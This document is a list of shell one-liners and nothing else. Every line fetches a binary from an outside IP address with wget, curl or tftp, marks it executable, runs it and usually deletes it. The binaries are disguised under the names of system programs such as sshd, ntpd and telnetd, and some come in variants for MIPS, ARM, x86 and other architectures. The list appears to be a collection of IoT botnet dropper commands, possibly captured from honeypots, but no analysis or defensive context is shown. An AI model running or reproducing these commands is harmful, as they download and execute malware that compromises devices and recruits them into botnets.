cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.50.205/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.8.25/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.8.25/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.8.25/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.8.25/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.8.25/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amimips; cat amimips >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amimips64; cat amimips64 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amimipsel; cat amimipsel >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amish2eb; cat amish2eb >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amish2elf; cat amish2elf >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amish4; cat amish4 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amix86; cat amix86 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amii486; cat amii486 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amii586; cat amii586 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amii686; cat amii686 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amipowerpc; cat amipowerpc >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amipowerpc440fp; cat amipowerpc440fp >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amim86k; cat amim86k >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amisparc; cat amisparc >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amiarmv4; cat amiarmv4 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amiarmv4tl; cat amiarmv4tl >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amiarmv5; cat amiarmv5 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/system || cd /mnt || cd /lib || cd /etc || cd /proc || cd /usr; wget http://128.199.40.73/amiarmv6; cat amiarmv6 >sshd; chmod 777 sshd || chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 212.237.34.105;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 212.237.34.105;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 212.237.34.105;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 212.237.34.105;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 212.237.34.105;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 212.237.34.105;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 212.237.34.105;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 212.237.34.105;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 212.237.34.105;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 212.237.34.105;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r [cpu] -g 212.237.34.105;cat [cpu] >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 212.237.34.105;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 212.237.34.105;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get wget;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get cron;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get sh;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get [cpu];cat [cpu] >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 174.138.58.34 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://62.4.1.215/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 107.178.96.108;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 107.178.96.108;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 107.178.96.108;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 107.178.96.108;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 107.178.96.108;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 107.178.96.108;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 107.178.96.108;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 107.178.96.108;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 107.178.96.108;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 107.178.96.108;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 107.178.96.108;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 107.178.96.108;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 107.178.96.108;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get wget;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get cron;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get sh;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.3.10.72 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk;cat Nhk >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk2;cat Nhk2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk3;cat Nhk3 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk4;cat Nhk4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk5;cat Nhk5 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk6;cat Nhk6 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk7;cat Nhk7 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk8;cat Nhk8 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk9;cat Nhk9 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk10;cat Nhk10 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk11;cat Nhk11 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.194.132 -c get Nhk12;cat Nhk12 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.66/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.mips; curl -O http://46.166.185.52/fyfa.mips; chmod +x fyfa.mips; ./fyfa.mips; rm -rf fyfa.mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.mpsl; curl -O http://46.166.185.52/fyfa.mpsl; chmod +x fyfa.mpsl; ./fyfa.mpsl; rm -rf fyfa.mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.sh4; curl -O http://46.166.185.52/fyfa.sh4; chmod +x fyfa.sh4; ./fyfa.sh4; rm -rf fyfa.sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.x86; curl -O http://46.166.185.52/fyfa.x86; chmod +x fyfa.x86; ./fyfa.x86; rm -rf fyfa.x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.arm; curl -O http://46.166.185.52/fyfa.arm; chmod +x fyfa.arm; ./fyfa.arm; rm -rf fyfa.arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.pcc; curl -O http://46.166.185.52/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.i686; curl -O http://46.166.185.52/fyfa.i686; chmod +x fyfa.i686; ./fyfa.i686; rm -rf fyfa.i686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.i586; curl -O http://46.166.185.52/fyfa.i586; chmod +x fyfa.i586; ./fyfa.i586; rm -rf fyfa.i586
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.m68k; curl -O http://46.166.185.52/fyfa.m68k; chmod +x fyfa.m68k; ./fyfa.m68k; rm -rf fyfa.m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.spc; curl -O http://46.166.185.52/fyfa.spc; chmod +x fyfa.spc; ./fyfa.spc; rm -rf fyfa.spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.52/fyfa.pcc; curl -O http://46.166.185.52/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.120.182/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.mips;cat fyfa.mips >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.mpsl;cat fyfa.mpsl >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.sh4;cat fyfa.sh4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.x86;cat fyfa.x86 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.arm;cat fyfa.arm >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.i686;cat fyfa.i686 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.pcc;cat fyfa.pcc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.i586;cat fyfa.i586 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.m68k;cat fyfa.m68k >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.spc;cat fyfa.spc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.207 -c get fyfa.pcc;cat fyfa.pcc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get wget;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get cron;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.208 -c get sh;cat sh >badbox;chmod +x *;./badbox
